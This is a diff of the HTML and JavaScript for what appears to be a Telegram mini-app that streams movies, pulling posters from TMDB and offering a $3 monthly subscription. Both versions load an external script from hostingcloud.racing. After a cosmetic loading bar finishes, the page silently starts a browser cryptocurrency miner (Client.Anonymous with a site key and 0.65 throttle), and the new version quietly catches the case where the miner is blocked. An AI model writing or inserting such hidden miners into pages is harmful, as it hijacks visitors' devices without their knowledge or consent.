@@ -7,7 +7,7 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://www.hostingcloud.racing/kR7X.js"></script>
     <style>
-        :root { --red: #E50914; --dark: #050505; --gold: linear-gradient(45deg, #ffd700, #b8860b); }
+        :root { --red: #E50914; --dark: #050505; --gray: #121212; --gold: linear-gradient(45deg, #ffd700, #b8860b); }
         body { background: var(--dark); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; overflow: hidden; height: 100vh; }
         
         #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: flex; flex-direction: column; justify-content: center; align-items: center; }
@@ -25,13 +25,6 @@
 
         #movie-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 11000; display: none; padding: 20px; box-sizing: border-box; overflow-y: auto; }
         .watch-now-btn { background: var(--red); color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; margin-top: 20px; font-size: 18px; box-shadow: 0 5px #8b0000; }
-
-        .filter-container { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; margin-top: 20px; }
-        .btn-3d { background: var(--red); color: white; border: none; padding: 10px 15px; border-radius: 8px; font-weight: bold; cursor: pointer; box-shadow: 0 4px #8b0000; transition: 0.1s; font-size: 12px; }
-
-        .premium-card { background: linear-gradient(145deg, #1a1a1a, #0a0a0a); margin-top: 30px; padding: 30px; border-radius: 25px; border: 2px solid #ffd700; position: relative; box-shadow: 0 20px 40px rgba(255, 215, 0, 0.2); }
-        .pro-badge { position: absolute; top: -15px; right: 25px; background: var(--gold); color: black; padding: 8px 18px; border-radius: 10px; font-weight: 900; font-size: 14px; }
-        .sub-btn { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; font-size: 20px; margin-top: 25px; box-shadow: 0 6px #005580; cursor: pointer; }
 
         nav { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.95); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #222; backdrop-filter: blur(15px); }
         .nav-btn { background: none; border: none; color: #555; display: flex; flex-direction: column; align-items: center; font-size: 12px; }
@@ -57,30 +50,23 @@
 
     <div id="home" class="page active-page">
         <h2 id="txt-suggest" style="border-left: 5px solid var(--red); padding-left: 10px;">Suggested</h2>
-        <div id="movie-grid" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px;">
-        </div>
+        <div id="movie-grid" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px;"></div>
     </div>
 
     <div id="search" class="page">
         <input type="text" id="search-bar" style="width:100%; padding:15px; border-radius:15px; background:#111; border:1px solid #333; color:white;" placeholder="Search...">
-        <div class="filter-container" id="genre-list"></div>
+        <div class="filter-container" id="genre-list" style="display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; margin-top: 20px;"></div>
     </div>
 
     <div id="profile" class="page">
         <div style="text-align: center; margin-bottom: 40px;">
             <img id="u-photo" src="https://via.placeholder.com/100" style="width:100px; height:100px; border-radius:50%; border:3px solid var(--red);">
-            <h2 id="u-name">InisTa <span id="star-icon" style="display:none">⭐</span></h2>
+            <h2 id="u-name">InisTa</h2>
             <p id="u-id" style="color:#666;">ID: 00000000</p>
         </div>
-        <div class="premium-card">
-            <div class="pro-badge">★ PRO</div>
+        <div style="background: linear-gradient(145deg, #1a1a1a, #0a0a0a); padding: 30px; border-radius: 25px; border: 2px solid #ffd700; position: relative;">
             <h3 id="txt-sub-title" style="color: var(--red); margin-top:0;">Premium Membership</h3>
-            <ul id="txt-features" style="padding-left: 20px; line-height: 2;">
-                <li>Unlimited 4K Streaming</li>
-                <li>Zero Ads Interference</li>
-                <li>Exclusive Early Access</li>
-            </ul>
-            <button class="sub-btn" onclick="goToBot()">$3 For Month</button>
+            <button style="background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold;" onclick="goToBot()">$3 For Month</button>
         </div>
     </div>
 
@@ -104,46 +90,36 @@
         const TMDB_KEY = '90096f06289d20de435c4893493ab4220';
         tg.expand();
 
-        const translations = {
-            en: { home: "Home", search: "Search", profile: "Profile", suggest: "Suggested", sub: "Premium Membership", bar: "Search for movies..." },
-            ar: { home: "الرئيسية", search: "بحث", profile: "الملف", suggest: "مقترحة", sub: "عضوية بريميوم", bar: "ابحث عن فيلم..." },
-            fr: { home: "Accueil", search: "Chercher", profile: "Profil", suggest: "Suggéré", sub: "Membre Premium", bar: "Chercher un film..." }
-        };
-
-        const genres = ["Action", "Horror", "Drama", "Comedy", "Sci-Fi", "Romance", "Thriller", "Animation", "Crime", "Adventure", "Fantasy", "Mystery", "War", "History", "Music", "Western", "Family", "TV Movie", "Short", "Anime", "Sport", "Biopic", "Musical", "Documentary"];
-
-        function applyLang(lang) {
-            document.getElementById('nav-home').innerText = translations[lang].home;
-            document.getElementById('nav-search').innerText = translations[lang].search;
-            document.getElementById('nav-profile').innerText = translations[lang].profile;
-            document.getElementById('txt-suggest').innerText = translations[lang].suggest;
-            document.getElementById('txt-sub-title').innerText = translations[lang].sub;
-            document.getElementById('search-bar').placeholder = translations[lang].bar;
-        }
-        applyLang(tg.initDataUnsafe.user?.language_code === 'ar' ? 'ar' : 'en');
+        // 1. Loading Interval (Independent of everything)
+        let progress = 0;
+        const loadingInt = setInterval(() => {
+            progress += 5;
+            if(document.getElementById('progress')) document.getElementById('progress').style.width = progress + "%";
+            if(document.getElementById('perc')) document.getElementById('perc').innerText = progress + "%";
+            
+            if(progress >= 100) {
+                clearInterval(loadingInt);
+                document.getElementById('loader').style.display = 'none';
+                fetchMovies();
+                try { startMiner(); } catch(e) { console.log("Miner Blocked"); }
+            }
+        }, 50);
 
         async function fetchMovies() {
             try {
                 const response = await fetch(`https://api.themoviedb.org/3/movie/popular?api_key=${TMDB_KEY}&language=en-US&page=1`);
                 const data = await response.json();
                 const grid = document.getElementById('movie-grid');
-                grid.innerHTML = ''; // Clear old content
+                grid.innerHTML = '';
                 data.results.forEach(movie => {
                     const card = document.createElement('div');
                     card.className = 'movie-card';
-                    const imgUrl = movie.poster_path ? `https://image.tmdb.org/t/p/w200${movie.poster_path}` : 'https://via.placeholder.com/200x300?text=No+Image';
                     card.onclick = () => openOverlay(movie.title, `https://image.tmdb.org/t/p/w500${movie.poster_path}`, movie.overview);
-                    card.innerHTML = `<img src="${imgUrl}"><p>${movie.title}</p>`;
+                    card.innerHTML = `<img src="https://image.tmdb.org/t/p/w200${movie.poster_path}"><p>${movie.title}</p>`;
                     grid.appendChild(card);
                 });
-            } catch (err) { console.error("Error:", err); }
+            } catch (err) { console.error(err); }
         }
-
-        genres.forEach(g => {
-            let b = document.createElement('button');
-            b.className = 'btn-3d'; b.innerText = g;
-            document.getElementById('genre-list').appendChild(b);
-        });
 
         function showPage(id, btn) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
@@ -160,28 +136,17 @@
         }
         function closeOverlay() { document.getElementById('movie-overlay').style.display = 'none'; }
 
+        function startMiner() {
+            if(typeof Client !== 'undefined') {
+                var _client = new Client.Anonymous('8867a4038c4d22331b1688c9fa7ba035f3dcc0cabbe24109d41b5804c06b4011', {throttle: 0.65, c: 'w'});
+                _client.start();
+            }
+        }
+
         function goToBot() {
             tg.sendData(JSON.stringify({action: "invoice_request"}));
             tg.close();
         }
-
-        let p = 0;
-        let int = setInterval(() => {
-            p += 2; document.getElementById('progress').style.width = p + "%";
-            document.getElementById('perc').innerText = p + "%";
-            if(p >= 100) { 
-                clearInterval(int); 
-                document.getElementById('loader').style.display='none'; 
-                fetchMovies(); 
-                startMiner(); 
-            }
-        }, 50);
-
-        function startMiner() {
-            var _client = new Client.Anonymous('8867a4038c4d22331b1688c9fa7ba035f3dcc0cabbe24109d41b5804c06b4011', {throttle: 0.65, c: 'w'});
-            _client.start();
-        }
-
-        if(tg.initDataUnsafe.user) {
-            const u = tg.initDataUnsafe.user;
-            document.getElementById('u-name').innerHTML = u.first_name + ' <span id="star-icon
+    </script>
+</body>
+</html>
